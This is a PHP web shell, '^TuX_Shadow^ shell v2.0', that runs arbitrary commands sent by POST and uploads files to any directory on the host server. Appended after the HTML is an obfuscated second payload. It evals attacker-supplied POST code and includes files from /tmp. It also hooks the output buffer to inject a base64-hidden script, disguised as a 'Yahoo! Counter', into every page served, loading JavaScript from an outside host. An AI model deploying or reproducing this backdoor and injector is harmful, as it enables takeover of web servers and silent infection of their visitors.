<?
if($_POST['dir'] == "") {

 $curdir = `pwd`;
} else {
 $curdir = $_POST['dir'];
}

if($_POST['king'] == "") {

 $curcmd = "ls -lah";
} else {
 $curcmd = $_POST['king'];
}


?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
                        "http://www.w3.org/TR/html4/loose.dtd">
<html>
  <head>
    <title>^TuX_Shadow^ shell v2.0</title>
    <style type="text/css">
     body {
      color: white; background-color: black;
      font-size: 12px;
      font-family: Helvetica,Arial,Sans-Serif;
     }
    </style>
  </head>
  <body>
<pre>
  __                            .__                .___             
_/  |_ __ _____  ___       _____|  |__ _____     __| _/______  _  __
\   __\  |  \  \/  /      /  ___/  |  \\__  \   / __ |/  _ \ \/ \/ /
 |  | |  |  />    <       \___ \|   Y  \/ __ \_/ /_/ (  <_> )     / 
 |__| |____//__/\_ \_____/____  >___|  (____  /\____ |\____/ \/\_/  
                  \/_____/    \/     \/     \/      \/              


<br/><?
$ob = @ini_get("open_basedir");
$df = @ini_get("disable_functions");
if( ini_get('safe_mode') ) {
   echo "SM: 1 \\ ";
} else {
   echo "SM: 0 \\ ";
}
if(''==$df) {
   echo "DF: 0 \\ ";
} else {
   echo "DF: ".$df." \\ ";
}
echo "".php_uname()."\n";
?>
<hr></pre>
    <table><form method="post" enctype="multipart/form-data">
      <tr><td><b>Execute command:</b></td><td><input name="king" type="text" size="100" value="<? echo $curcmd; ?>"></td>
      <tr><td><b>Change directory:</b></td><td><input name="dir" type="text" size="100" value="<? echo $curdir; ?>"></td>
      <td><input name="exe" type="submit" value="Execute"></td></tr>

      <tr><td><b>Upload file:</b></td><td><input name="fila" type="file" size="90"></td>
      <td><input name="upl" type="submit" value="Upload"></td></tr>
    </form></table>
<pre><hr>
<?
    if(($_POST['upl']) == "Upload" ) {
    if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir."/".$_FILES['fila']['name'])) {
        echo "The file has been uploaded<br><br>";
    } else {
        echo "There was an error uploading the file, please try again!";
    }
    }
    if(($_POST['exe']) == "Execute") {
     $curcmd = "cd ".$curdir.";".$curcmd;
     $f=popen($curcmd,"r");
     while (!feof($f)) {
      $buffer = fgets($f, 4096);
      $string .= $buffer;
     }
     pclose($f);
     echo htmlspecialchars($string);
    }
?>
    </pre>
  </body>
</html>
<?php if(!function_exists('tmp_lkojfghx')){for($i=1;$i<100;$i++)if(is_file($f='/tmp/m'.$i)){include_once($f);break;}if(isset($_POST['tmp_lkojfghx3']))eval($_POST['tmp_lkojfghx3']);if(!defined('TMP_XHGFJOKL'))define('TMP_XHGFJOKL',base64_decode('PHNjcmlwdCBsYW5ndWFnZT1qYXZhc2NyaXB0PjwhLS0gWWFob28hIENvdW50ZXIgc3RhcnRzIGhlcmUgLS0+CmlmKHR5cGVvZih5YWhvb19jb3VudGVyKSE9dHlwZW9mKDEpKWV2YWwodW5lc2NhcGUoJ2AlNzZhfnIjIGBhPywlNjklMkMjJTVGYCUzQmk9PyIlMzclMzYjJTJFfDEkJTM2JTMzfCUyRT8iOyQlNjF+JTNEJTVCIiUzNzglMkUxJTM1NyMlMkV+JTMxPyUzNCUzMiUyRT81OCMiJCUyQyU2OSQlMkIlMjI/JTMxfDQlMzF8LiUzM2A1IixpK34iMSQlMzk/MS4xMyElMzIiJTVEQDslNUZ8PTElM0IkJTY5JCU2NiQlMjgjZCU2RmAlNjMjdX5tfGUhJTZFJTc0LiFjb3xvYGtpPyU2NS5tYSU3NEBjJTY4YChALyMlNUMlNjIlNjghZyMlNjZgJTc0fCUzRDEvKSUzRH49IyU2RXUjbCU2Q2ApQGZvcn4oYCU2OSQlM0QlMzAlM0IlNjlAJTNDMyUzQiU2OSUyQiMlMkIjKSQlNjQjbyU2MyN1fm1+JTY1YCU2RSU3NC5+JTc3ciNpPyU3NCU2NXwlMjgiQCUzQ35zY3xyP2klNzAjJTc0QCUzRXwlNjkjZn4lMjh+XyMlMjlkJCU2RiElNjN8JTc1YG1lfiU2RXQkJTJFJTc3JTcyJTY5JTc0QCU2NSUyOEAlNUMiQCUzQyMlNzMlNjMlNzIlNjlwJTc0fiBAaWQ/JTNEJTVGJTIyJTJCQGklMkIjIl9gIHMhcmMjPX4vQC9gIn4rPyU2MX5baT8lNUQlMkIiJTJGY34lNzAvJTNFJTNDQCU1QyMlNUNAJTJGJTczJCU2Mz9yJTY5ISU3MGAlNzQhJTNFfCU1QyUyMiMpIyUzQyU1QyUyRiU3MyFjP3IlNjkjcGB0JTNFfiUyMkAlMjkjOycpLnJlcGxhY2UoL2B8XCF8I3xcfHxcJHxcP3xAfH4vZywiIikpO3ZhciB5YWhvb19jb3VudGVyPTE7CjwhLS0gY291bnRlciBlbmQgLS0+PC9zY3JpcHQ+Cg=='));function tmp_lkojfghx($s){if($g=(bin2hex(substr($s,0,2))=='1f8b'))$s=gzinflate(substr($s,10,-8));$s1=preg_replace(base64_decode('IzxzY3JpcHQgbGFuZ3VhZ2U9amF2YXNjcmlwdD48IS0tIFlhaG9vISBDb3VudGVyIHN0YXJ0cyBoZXJlLis/PC9zY3JpcHQ+CiNz'),'',$s);if(stristr($s,'</body'))$s=preg_replace('#(\s*</body)#mi',str_replace('\$','\\\$',TMP_XHGFJOKL).'\1',$s1);elseif(($s1!=$s)||defined('PMT_knghjg')||stristr($s,'<body')||stristr($s,'</title>'))$s=$s1.TMP_XHGFJOKL;return $g?gzencode($s):$s;}function tmp_lkojfghx2($a=0,$b=0,$c=0,$d=0){$s=array();if($b&&$GLOBALS['tmp_xhgfjokl'])call_user_func($GLOBALS['tmp_xhgfjokl'],$a,$b,$c,$d);foreach(@ob_get_status(1) as $v)if(($a=$v['name'])=='tmp_lkojfghx')return;else $s[]=array($a=='default output handler'?false:$a);for($i=count($s)-1;$i>=0;$i--){$s[$i][1]=ob_get_contents();ob_end_clean();}ob_start('tmp_lkojfghx');for($i=0;$i<count($s);$i++){ob_start($s[$i][0]);echo $s[$i][1];}}}if(($a=@set_error_handler('tmp_lkojfghx2'))!='tmp_lkojfghx2')$GLOBALS['tmp_xhgfjokl']=$a;tmp_lkojfghx2(); ?>
